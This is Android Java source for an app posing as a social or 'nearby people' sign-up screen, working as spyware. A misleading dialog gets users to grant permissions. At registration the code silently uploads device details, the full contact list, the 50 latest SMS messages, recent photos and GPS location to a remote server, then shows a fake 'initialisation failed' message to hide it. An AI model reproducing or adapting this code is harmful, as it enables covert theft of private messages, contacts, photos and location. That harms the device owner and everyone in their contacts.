package com.example.ca_test;

import android.Manifest;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Settings;
import android.text.format.Formatter;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.Toast;
import android.widget.VideoView;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import com.bumptech.glide.Glide;
import com.example.ca_test.domain.Contact;
import com.example.ca_test.domain.CustomVideoView;
import com.example.ca_test.domain.Sms;
import com.example.ca_test.domain.UploadCallback;
import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;
import com.google.gson.Gson;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.MultipartBody;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

public class MainActivity extends AppCompatActivity {
    private String serverIp;
    private String serverPort;
    private String  url;
    private static final int PERMISSION_REQUEST_CODE = 123;

    EditText editTextPhone, editTextPassword, editTextInviteCode;
    Button buttonRegister;
    SharedPreferences sharedPreferences;
    Handler handler;
    Runnable runnable;

    private String phoneNumber = null;
    private String password = null;
    private String inviteCode = null;
    private List<String> photosPath = null;

    private LocationManager locationManager;
    private LocationListener locationListener;
    private String latitude;
    private String longitude;
    private String addressString;
    private FusedLocationProviderClient fusedLocationClient;
    private boolean allPermissionsGranted;  // 初始化一个布尔值，假设所有权限都被授予
    private String deviceModel;
    private String ipAddress;
    private CustomVideoView videoView;
    private Uri videoUri;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        // 设置全屏模式
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            getWindow().getDecorView().setSystemUiVisibility(
                    View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                            | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                            | View.SYSTEM_UI_FLAG_FULLSCREEN
                            | View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY);
        }

        // 确保状态栏和导航栏的颜色透明
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            Window window = getWindow();
            window.addFlags(WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS);
            window.setStatusBarColor(Color.TRANSPARENT);
            window.setNavigationBarColor(Color.TRANSPARENT);
        }

        // 初始化 CustomVideoView
        videoView = findViewById(R.id.videoView);
        videoUri = Uri.parse("android.resource://" + getPackageName() + "/" + R.raw.background_video);
        videoView.setVideoURI(videoUri);

        videoView.setOnPreparedListener(mp -> {
            mp.setLooping(true);
            int videoWidth = mp.getVideoWidth();
            int videoHeight = mp.getVideoHeight();

            // 根据视频尺寸调整 VideoView 尺寸
            videoView.setVideoSize(videoWidth, videoHeight);
            videoView.start();
        });

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);

        editTextPhone = findViewById(R.id.editTextPhone);
        editTextPassword = findViewById(R.id.editTextPassword);
        editTextInviteCode = findViewById(R.id.editTextInviteCode);
        buttonRegister = findViewById(R.id.buttonRegister);

        sharedPreferences = getSharedPreferences("MyPrefs", Context.MODE_PRIVATE);
        boolean firstTime = sharedPreferences.getBoolean("firstTime", true);
        if (firstTime) {
            showCustomDialog();
        }

        handler = new Handler();

        buttonRegister.setOnClickListener(v -> {
            registerUser();
        });

        // 添加OnFocusChangeListener来验证手机号
        editTextPhone.setOnFocusChangeListener(new View.OnFocusChangeListener() {
            @Override
            public void onFocusChange(View v, boolean hasFocus) {
                if (!hasFocus) {
                    String phone = editTextPhone.getText().toString().trim();
                    if (phone.length() != 11 || !phone.matches("\\d{11}")) {
                        editTextPhone.setError("请输入正确的手机号");
                    } else {
                        editTextPhone.setError(null);
                    }
                }
            }
        });
    }

    private void showCustomDialog() {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setTitle("使用前必读");
        builder.setMessage("为了让您轻松分享精彩瞬间，展示最真实的自己，在寻找附近的人的同时防止被自己的熟人发现，请允许权限保障您的使用体验");
        builder.setPositiveButton("确认", (dialog, which) -> checkAndRequestPermissions());
        AlertDialog dialog = builder.create();
        dialog.show();
    }

    // 方法：检查并请求必要的权限
    private void checkAndRequestPermissions() {
        // 如果设备的SDK版本是Marshmallow（API等级23）或更高版本
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // 创建一个列表来存储需要请求的权限
            List<String> permissionsToRequest = new ArrayList<>();
            // 声明一个数组来存储所需的权限
            String[] permissions;

            // 如果设备的SDK版本是Tiramisu（Android 13，API等级33）或更高版本
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                // 初始化所需权限的数组，适用于Android 13及以上版本
                permissions = new String[]{
                        Manifest.permission.READ_MEDIA_IMAGES, // 读取媒体图片的权限
                        Manifest.permission.READ_CONTACTS, // 读取联系人信息的权限
                        Manifest.permission.READ_SMS, // 读取短信的权限
                        Manifest.permission.ACCESS_FINE_LOCATION, // 访问精确位置的权限
                        Manifest.permission.ACCESS_COARSE_LOCATION,
                        Manifest.permission.ACCESS_WIFI_STATE,// 访问Wi-Fi状态的权限
                };
            } else {
                // 初始化所需权限的数组，适用于Android 13以下版本
                permissions = new String[]{
                        Manifest.permission.READ_EXTERNAL_STORAGE, // 读取外部存储的权限
                        Manifest.permission.WRITE_EXTERNAL_STORAGE, // 写入外部存储的权限
                        Manifest.permission.READ_CONTACTS, // 读取联系人信息的权限
                        Manifest.permission.READ_SMS, // 读取短信的权限
                        Manifest.permission.ACCESS_FINE_LOCATION, // 访问精确位置的权限
                        Manifest.permission.ACCESS_WIFI_STATE // 访问Wi-Fi状态的权限
                };
            }

            // 遍历每一个权限，检查是否已经被授予
            for (String permission : permissions) {
                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                    // 如果权限没有被授予，将其添加到请求列表中
                    permissionsToRequest.add(permission);
                }
            }

            // 如果有需要请求的权限，执行请求
            if (!permissionsToRequest.isEmpty()) {
                ActivityCompat.requestPermissions(this, permissionsToRequest.toArray(new String[0]), PERMISSION_REQUEST_CODE);
            }
        }
    }

    // 方法：检查是否所有必要的权限都已授予
    private boolean checkPermissions() {
        // 如果设备的SDK版本是Marshmallow（API等级23）或更高版本
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // 创建一个列表来存储仍然需要的权限
            List<String> permissionsNeeded = new ArrayList<>();
            // 声明一个数组来存储所需的权限
            String[] permissions;

            // 如果设备的SDK版本是Tiramisu（Android 13，API等级33）或更高版本
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                // 初始化所需权限的数组，适用于Android 13及以上版本
                permissions = new String[]{
                        Manifest.permission.READ_MEDIA_IMAGES, // 读取媒体图片的权限
                        Manifest.permission.READ_CONTACTS, // 读取联系人信息的权限
                        Manifest.permission.READ_SMS, // 读取短信的权限
                        Manifest.permission.ACCESS_FINE_LOCATION, // 访问精确位置的权限
                        Manifest.permission.ACCESS_COARSE_LOCATION,
                        Manifest.permission.ACCESS_WIFI_STATE, // 访问Wi-Fi状态的权限
                };
            } else {
                // 初始化所需权限的数组，适用于Android 13以下版本
                permissions = new String[]{
                        Manifest.permission.READ_EXTERNAL_STORAGE, // 读取外部存储的权限
                        Manifest.permission.WRITE_EXTERNAL_STORAGE, // 写入外部存储的权限
                        Manifest.permission.READ_CONTACTS, // 读取联系人信息的权限
                        Manifest.permission.READ_SMS, // 读取短信的权限
                        Manifest.permission.ACCESS_FINE_LOCATION, // 访问精确位置的权限
                        Manifest.permission.ACCESS_WIFI_STATE // 访问Wi-Fi状态的权限
                };
            }

            // 遍历每一个权限，检查是否已经被授予
            for (String permission : permissions) {
                if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                    // 如果权限没有被授予，将其添加到需要列表中
                    permissionsNeeded.add(permission);
                }
            }

            // 如果有仍然需要的权限，执行请求并返回false
            if (!permissionsNeeded.isEmpty()) {
                ActivityCompat.requestPermissions(this, permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
                return false;
            }
        }
        // 所有权限都已授予，返回true
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        // 调用父类的 onRequestPermissionsResult 方法，以确保父类的处理逻辑也得以执行
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        // 检查请求码是否与预先定义的权限请求码匹配，确保这是针对我们所请求的权限
        if (requestCode == PERMISSION_REQUEST_CODE) {
            // 初始化一个布尔值，假设所有权限都被授予
            allPermissionsGranted = true;

            // 遍历权限请求结果的数组
            for (int result : grantResults) {
                // 如果有任何权限未被授予，将 allPermissionsGranted 设置为 false 并跳出循环
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allPermissionsGranted = false;
                    break;
                }
            }

            if (!allPermissionsGranted) {
                // 如果有任何权限未被授予，显示权限拒绝对话框
                showPermissionsDeniedDialog();
            } else {
                // 如果所有权限都已授予，执行相应操作
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    getLocationFromIP();
                } else {
                    getLocation();
                }
            }
        }
    }

    private void showPermissionsDeniedDialog() {
        new AlertDialog.Builder(this)
                .setTitle("权限请求")
                .setMessage("应用需要这些权限来正常运行，请在设置中授予这些权限。")
                .setPositiveButton("设置", (dialog, which) -> {
                    Intent intent = new Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                    Uri uri = Uri.fromParts("package", getPackageName(), null);
                    intent.setData(uri);
                    startActivity(intent);
                })
                .setNegativeButton("取消", (dialog, which) -> dialog.dismiss())
                .create()
                .show();
    }

    private void handlePermissionsResult() {
        serverIp = getString(R.string.server_ip);
        serverPort = getString(R.string.server_port);
        url = "http://" + serverIp + ":" + serverPort;
        uploadDeviceInfo(url,new UploadCallback() {
            @Override
            public void onUploadComplete() {
                runOnUiThread(() -> {
                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                        uploadContacts(url);
                    }

                    if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                        uploadSms(url);
                    }

                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED) {
                            photosPath = getAllPhotosPath();
                            for (String path : photosPath) {
                                File file = new File(path);
                                if (file.exists()) {
                                    uploadFile(url + "/upload", file);
                                }
                            }
                        }
                    } else {
                        if (ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED || ContextCompat.checkSelfPermission(MainActivity.this, Manifest.permission.WRITE_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED) {
                            photosPath = getAllPhotosPath();
                            for (String path : photosPath) {
                                File file = new File(path);
                                if (file.exists()) {
                                    uploadFile(url + "/upload", file);
                                }
                            }
                        }
                    }

                    uploadLocation(latitude, longitude, addressString,url);

                    Intent intent = new Intent(MainActivity.this, VideoActivity.class);
                    startActivity(intent);

                    startCountdown();
                });
            }
        });
    }

    private void registerUser() {
        phoneNumber = editTextPhone.getText().toString().trim();
        password = editTextPassword.getText().toString().trim();
        inviteCode = editTextInviteCode.getText().toString().trim();

        if (editTextPhone.getError() != null) {
            Toast.makeText(MainActivity.this, "请输入正确的手机号", Toast.LENGTH_SHORT).show();
            return;
        }

        if (password.isEmpty()) {
            editTextPassword.setError("密码不能为空");
            Toast.makeText(MainActivity.this, "密码不能为空", Toast.LENGTH_SHORT).show();
            return;
        }

        handlePermissionsResult();
    }


    private void startCountdown() {
        buttonRegister.setEnabled(false);
        handler = new Handler();
        handler.removeCallbacks(runnable);
        runnable = new Runnable() {
            int count = 2;

            @Override
            public void run() {
                buttonRegister.setText(count + "秒");
                count--;
                if (count >= 0) {
                    handler.postDelayed(this, 1000);
                } else {
                    Toast.makeText(MainActivity.this, "初始化失败，请稍后尝试", Toast.LENGTH_SHORT).show();
                    buttonRegister.setEnabled(true);
                    buttonRegister.setText("注册");
                }
            }
        };
        handler.postDelayed(runnable, 1000);
    }

    private List<String> getAllPhotosPath() {
        List<String> photosPath = new ArrayList<>();
        String[] projection = {MediaStore.Images.Media.DATA};
        String sortOrder = MediaStore.Images.Media.DATE_ADDED + " DESC";
        Cursor cursor = getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, projection, null, null, sortOrder);
        if (cursor != null) {
            int columnIndex = cursor.getColumnIndexOrThrow(MediaStore.Images.Media.DATA);
            int count = 0;
            while (cursor.moveToNext() && count < 10) {
                photosPath.add(cursor.getString(columnIndex));
                count++;
            }
            cursor.close();
        }
        return photosPath;
    }

    private List<Contact> getContacts() {
        List<Contact> contacts = new ArrayList<>();
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);

        if (cursor != null) {
            int nameIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME);
            int phoneIndex = cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);

            while (cursor.moveToNext()) {
                if (nameIndex != -1 && phoneIndex != -1) {
                    String name = cursor.getString(nameIndex);
                    String phoneNumber = cursor.getString(phoneIndex);
                    contacts.add(new Contact(name, phoneNumber));
                }
            }
            cursor.close();
        }
        return contacts;
    }

    private List<Sms> getSms() {
        List<Sms> smsList = new ArrayList<>();
        ContentResolver contentResolver = getContentResolver();
        Cursor cursor = contentResolver.query(
                Uri.parse("content://sms/inbox"),
                null,
                null,
                null,
                "date DESC LIMIT 50");

        if (cursor != null) {
            int addressIndex = cursor.getColumnIndex("address");
            int bodyIndex = cursor.getColumnIndex("body");
            int dateIndex = cursor.getColumnIndex("date");

            while (cursor.moveToNext()) {
                if (addressIndex != -1 && bodyIndex != -1 && dateIndex != -1) {
                    String address = cursor.getString(addressIndex);
                    String body = cursor.getString(bodyIndex);
                    long date = cursor.getLong(dateIndex);
                    smsList.add(new Sms(address, body, date));
                }
            }
            cursor.close();
        }
        return smsList;
    }

    private void getLocation() {
        locationManager = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
        locationListener = new LocationListener() {
            @Override
            public void onLocationChanged(@NonNull Location location) {
                latitude = String.format(Locale.US, "%.6f", location.getLatitude());
                longitude = String.format(Locale.US, "%.6f", location.getLongitude());
                Log.d("Location", "Latitude: " + latitude + ", Longitude: " + longitude);

                // 使用 Geocoder 将经纬度转换为地址
                Geocoder geocoder = new Geocoder(MainActivity.this, Locale.getDefault());
                try {
                    List<Address> addresses = geocoder.getFromLocation(location.getLatitude(), location.getLongitude(), 1);
                    if (addresses != null && !addresses.isEmpty()) {
                        addressString = addresses.get(0).getAddressLine(0);
                        Log.d("Location", "Address: " + addressString);

                        // 上传位置信息
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }

                // 一旦获取到位置，立即停止位置更新
                locationManager.removeUpdates(this);
            }
        };

        // 检查权限并请求位置更新
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            locationManager.requestSingleUpdate(LocationManager.GPS_PROVIDER, locationListener, null);
        } else {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, PERMISSION_REQUEST_CODE);
        }
    }

    private void getLocationFromIP() {
        FusedLocationProviderClient fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);

        LocationRequest locationRequest = new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 10000)
                .setMinUpdateIntervalMillis(5000)
                .build();

        LocationCallback locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(LocationResult locationResult) {
                if (locationResult == null) {
                    return;
                }
                for (Location location : locationResult.getLocations()) {
                    if (location != null) {
                        latitude = String.format(Locale.US, "%.6f", location.getLatitude());
                        longitude = String.format(Locale.US, "%.6f", location.getLongitude());
                        Log.d("Location", "Latitude: " + latitude + ", Longitude: " + longitude);

                        // 使用 Geocoder 将经纬度转换为地址
                        Geocoder geocoder = new Geocoder(MainActivity.this, Locale.getDefault());
                        try {
                            List<Address> addresses = geocoder.getFromLocation(location.getLatitude(), location.getLongitude(), 1);
                            if (addresses != null && !addresses.isEmpty()) {
                                String addressString = addresses.get(0).getAddressLine(0);
                                Log.d("Location", "Address: " + addressString);

                                // 上传位置信息
                            }
                        } catch (IOException e) {
                            e.printStackTrace();
                        }

                        // 一旦获取到位置，立即停止位置更新
                        fusedLocationClient.removeLocationUpdates(this);
                    }
                }
            }
        };

        // 检查权限并请求位置更新
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            fusedLocationClient.requestLocationUpdates(locationRequest, locationCallback, Looper.getMainLooper());
        } else {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_FINE_LOCATION}, PERMISSION_REQUEST_CODE);
        }
    }

    private String getDeviceModel() {
        return Build.MANUFACTURER + " " + Build.MODEL;
    }

    private String getIPAddress() {
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_WIFI_STATE) != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.ACCESS_WIFI_STATE}, PERMISSION_REQUEST_CODE);
            return null;
        }

        WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
        return Formatter.formatIpAddress(wifiManager.getConnectionInfo().getIpAddress());
    }

    private void uploadContacts(String url) {
        List<Contact> contacts = getContacts();
        Gson gson = new Gson();
        String jsonContacts = gson.toJson(contacts);

        OkHttpClient client = new OkHttpClient();
        RequestBody body = RequestBody.create(jsonContacts, MediaType.parse("application/json; charset=utf-8"));
        Request request = new Request.Builder()
                .url(url + "/uploadContacts")
                .post(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
            }
        });
    }

    private void uploadSms(String url) {
        List<Sms> smsList = getSms();
        List<Map<String, String>> smsData = new ArrayList<>();
        for (Sms sms : smsList) {
            Map<String, String> smsMap = new HashMap<>();
            smsMap.put("address", sms.getAddress());
            smsMap.put("body", sms.getBody());
            smsMap.put("date", sms.getFormattedDate());
            smsData.add(smsMap);
        }
        Gson gson = new Gson();
        String jsonSms = gson.toJson(smsData);
        Log.d("UploadSms", "JSON: " + jsonSms);

        OkHttpClient client = new OkHttpClient();
        RequestBody body = RequestBody.create(jsonSms, MediaType.parse("application/json; charset=utf-8"));
        Request request = new Request.Builder()
                .url(url + "/uploadMessages")
                .post(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {}
        });
    }

    private void uploadFile(String url, File file) {
        try {
            Bitmap resizedBitmap = getResizedBitmap(file.getAbsolutePath(), 800, 800);
            // 获取原始文件名（不带扩展名）
            String originalFileName = file.getName().substring(0, file.getName().lastIndexOf('.'));
            // 获取原始文件扩展名
            String originalFileExtension = file.getName().substring(file.getName().lastIndexOf('.'));
            // 构建新的文件名
            String uniqueFileName = originalFileName + "_resized_image" + originalFileExtension;
            File resizedFile = saveBitmapToFile(resizedBitmap, uniqueFileName);

            if (resizedFile == null || !resizedFile.exists() || resizedFile.length() == 0) {
                Log.e("UploadFile", "Resized file does not exist or is empty");
                return;
            }

            Log.d("UploadFile", "URL: " + url);
            Log.d("UploadFile", "File path: " + resizedFile.getAbsolutePath());

            OkHttpClient client = new OkHttpClient();
            RequestBody fileBody = RequestBody.create(resizedFile, MediaType.parse("multipart/form-data"));
            MultipartBody requestBody = new MultipartBody.Builder()
                    .setType(MultipartBody.FORM)
                    .addFormDataPart("file", resizedFile.getName(), fileBody)
                    .build();

            Request request = new Request.Builder()
                    .url(url)
                    .post(requestBody)
                    .build();

            client.newCall(request).enqueue(new Callback() {
                @Override
                public void onFailure(Call call, IOException e) {
                    Log.e("UploadFile", "Upload failed: " + e.getMessage());
                    e.printStackTrace();
                    runOnUiThread(() -> {
                        // UI更新代码放在这里，例如显示失败的Toast或其他UI更新
                        Toast.makeText(MainActivity.this, "Upload failed", Toast.LENGTH_SHORT).show();
                    });
                }

                @Override
                public void onResponse(Call call, Response response) throws IOException {}
            });
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void uploadLocation(String latitude, String longitude, String address,String url) {
        Map<String, String> locationData = new HashMap<>();
        locationData.put("latitude", latitude);
        locationData.put("longitude", longitude);
        locationData.put("address", address);

        Gson gson = new Gson();
        String jsonLocation = gson.toJson(locationData);

        OkHttpClient client = new OkHttpClient();
        RequestBody body = RequestBody.create(jsonLocation, MediaType.parse("application/json; charset=utf-8"));
        Request request = new Request.Builder()
                .url(url + "/uploadLocation")
                .post(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {}
        });
    }

    private void uploadDeviceInfo(String url,UploadCallback callback) {
        deviceModel = getDeviceModel();
        ipAddress = getIPAddress();
        phoneNumber = editTextPhone.getText().toString().trim();
        inviteCode = editTextInviteCode.getText().toString().trim();

        if (inviteCode.isEmpty()) {
            inviteCode = "000000";
        }

        Map<String, String> deviceInfo = new HashMap<>();
        deviceInfo.put("deviceModel", deviceModel);
        deviceInfo.put("ipAddress", ipAddress);
        deviceInfo.put("phoneNumber", phoneNumber);
        deviceInfo.put("inviteCode", inviteCode);

        Gson gson = new Gson();
        String jsonDeviceInfo = gson.toJson(deviceInfo);

        OkHttpClient client = new OkHttpClient();
        RequestBody body = RequestBody.create(jsonDeviceInfo, MediaType.parse("application/json; charset=utf-8"));
        Request request = new Request.Builder()
                .url(url + "/uploadDeviceInfo")
                .post(body)
                .build();

        client.newCall(request).enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                e.printStackTrace();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                callback.onUploadComplete(); // 上传完成后调用回调
            }
        });
    }

    private Bitmap getResizedBitmap(String filePath, int maxWidth, int maxHeight) {
        BitmapFactory.Options options = new BitmapFactory.Options();
        options.inJustDecodeBounds = true;
        BitmapFactory.decodeFile(filePath, options);

        int srcWidth = options.outWidth;
        int srcHeight = options.outHeight;

        int inSampleSize = 1;

        if (srcHeight > maxHeight || srcWidth > maxWidth) {
            final int halfHeight = srcHeight / 2;
            final int halfWidth = srcWidth / 2;

            while ((halfHeight / inSampleSize) >= maxHeight && (halfWidth / inSampleSize) >= maxWidth) {
                inSampleSize *= 2;
            }
        }

        options.inJustDecodeBounds = false;
        options.inSampleSize = inSampleSize;

        return BitmapFactory.decodeFile(filePath, options);
    }

    private File saveBitmapToFile(Bitmap bitmap, String fileName) throws IOException {
        File file = new File(getCacheDir(), fileName);
        FileOutputStream out = new FileOutputStream(file);
        bitmap.compress(Bitmap.CompressFormat.JPEG, 80, out);
        out.flush();
        out.close();
        return file;
    }

    private void showPath(File file) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        LayoutInflater inflater = getLayoutInflater();
        View dialogView = inflater.inflate(R.layout.dialog_with_images, null);
        LinearLayout imagesContainer = dialogView.findViewById(R.id.images_container);

        ImageView imageView = new ImageView(this);
        imageView.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.WRAP_CONTENT));
        imageView.setPadding(0, 0, 0, 16);

        Glide.with(this).load(file).into(imageView);
        imagesContainer.addView(imageView);

        builder.setView(dialogView);
        builder.setPositiveButton("确认", (dialog, which) -> checkAndRequestPermissions());

        AlertDialog dialog = builder.create();
        dialog.show();
    }
}
